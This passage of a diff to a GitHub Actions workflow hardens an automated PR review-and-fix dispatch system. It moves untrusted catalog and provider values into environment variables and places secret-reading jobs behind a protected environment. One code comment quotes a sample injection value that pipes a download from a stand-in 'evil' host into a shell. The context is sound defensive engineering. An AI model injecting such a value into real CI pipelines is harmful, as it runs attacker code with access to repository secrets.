+      # write, no marker write, no comment. The fix lane admits on a concluded-RED gate ALONE too
+      # (GAP-A `needs-ci-fix`, review-state-agnostic), so a NON-DRAFT, ARMED, passed PR reaches this
+      # step; retracting its reviewed-sha marker is precisely what makes dispatch-claim's disarm net
+      # read `marker != head` on an armed PR as a safety violation and disable-auto + dequeue +
+      # REDRAFT it. A passed PR has nothing to hand to the review lane either — the pass IS the
+      # verdict.
+      #
+      # `--head-sha` is REQUIRED and load-bearing (round-2 finding 1): the label flip ALONE only
+      # relocates the spin, because a completed request-changes review left `sparq-reviewed-sha ==
+      # head` and a DRAFTED PR carrying that marker is not re-emitted as needs-review — a green gate
+      # instead dispatches a review run whose resolve step exits `already_done` with no work done,
+      # and a pending gate leaves NO lane owning the PR. This is the head the verdict was proved NOT
+      # bound to, so its reviewed-sha assertion is retracted and the review lane provably takes over.
+      - name: Hand a deferred fix back to the review lane (unbound/stale verdict)
+        if: ${{ inputs.mode == 'fix' && needs.run.outputs.verdict_staged == 'false' && needs.run.outputs.verdict_stale_reason != '' }}
+        env:
+          GH_TOKEN: ${{ steps.app-token-outcome.outputs.token }}
+          # Script-authored value, but it reaches the CLI via env like every other non-literal
+          # (issue #199): never interpolated into this `run:` shell source.
+          STALE_REASON: ${{ needs.run.outputs.verdict_stale_reason }}
+        run: |
+          python3 registry/scripts/worker-pr.py fix-lane-defer \
+            --repo "${{ inputs.target_repo }}" \
+            --pr "${{ inputs.pr_number }}" \
+            --issue "${{ needs.resolve.outputs.issue }}" \
+            --head-sha "${{ needs.resolve.outputs.head_sha }}" \
+            --stale-reason "$STALE_REASON"
 
   # Escalate an unresolvable inverse chain to a human immediately (never silent-queue): if the
   # routing catalog cannot resolve a concrete model for this direction, a human must decide.
@@ -1417,6 +1621,10 @@ jobs:
     if: ${{ needs.resolve.outputs.unresolvable == 'true' }}
     runs-on: ubuntu-latest
     timeout-minutes: 10
+    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY, which live in the
+    # `dispatch-secrets` environment (deployment-branch policy: default branch only) — full
+    # rationale on the `claim` job in dispatch.yml.
+    environment: dispatch-secrets
     permissions:
       contents: read
       issues: write   # write: ops-alert upsert in the registry
@@ -1466,6 +1674,10 @@ jobs:
     needs: [resolve, claim, run]
     runs-on: ubuntu-latest
     timeout-minutes: 10
+    # SECRET-EXFIL GUARD (issue #101): reads PROVENANCE_SALT, which lives in the
+    # `dispatch-secrets` environment (deployment-branch policy: default branch only) — full
+    # rationale on the `claim` job in dispatch.yml.
+    environment: dispatch-secrets
     permissions:
       contents: write   # CAS-append data/model-health.json (on the `ledger` branch) via github.token
     steps:
@@ -1483,13 +1695,28 @@ jobs:
           # handle so only the 16-hex hash is stored. This job runs no target code.
           WORKER_ACCOUNT_HANDLE: ${{ needs.claim.outputs.account }}
           PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
+          # Catalog-controlled (provider/alias) and provider-derived (reset-hint) fields reach this
+          # contents:write + PROVENANCE_SALT job via env ONLY — never in the run: shell source,
+          # where `x"; curl evil|sh; echo "` would execute (issue #199). model-health.py record
+          # re-validates the provider against {anthropic, openai, fleet}.
+          PROVIDER: ${{ needs.claim.outputs.provider }}
+          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
+          EXIT_CLASS: ${{ needs.run.outputs.exit_class }}
+          RESET_HINT: ${{ needs.run.outputs.reset_hint }}
+          # The attempt of the run job that PRODUCED the outcome — never this recorder job's own
+          # $GITHUB_RUN_ATTEMPT (review round 1 of #425): a recorder-only retry replays the run
+          # job's preserved output (same attempt -> the script dedups the replay), while a full
+          # re-run re-executes the run job, whose fresh attempt keeps the genuinely new outcome
+          # countable. The empty-output fallback below fails toward RECORDING (a rare duplicate
+          # beats a silently dropped outcome).
+          OUTCOME_ATTEMPT: ${{ needs.run.outputs.outcome_attempt }}
         run: |
           python3 registry/scripts/model-health.py record \
-            --provider "${{ needs.claim.outputs.provider }}" \
-            --model-alias "${{ needs.claim.outputs.model }}" \
-            --exit-class "${{ needs.run.outputs.exit_class }}" \
-            --reset-hint "${{ needs.run.outputs.reset_hint }}" \
-            --run-id "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
+            --provider "$PROVIDER" \
+            --model-alias "$MODEL_ALIAS" \
+            --exit-class "$EXIT_CLASS" \
+            --reset-hint "$RESET_HINT" \
+            --run-id "$GITHUB_RUN_ID.${OUTCOME_ATTEMPT:-$GITHUB_RUN_ATTEMPT}"
 
   release:
     name: Always release the review/fix lease
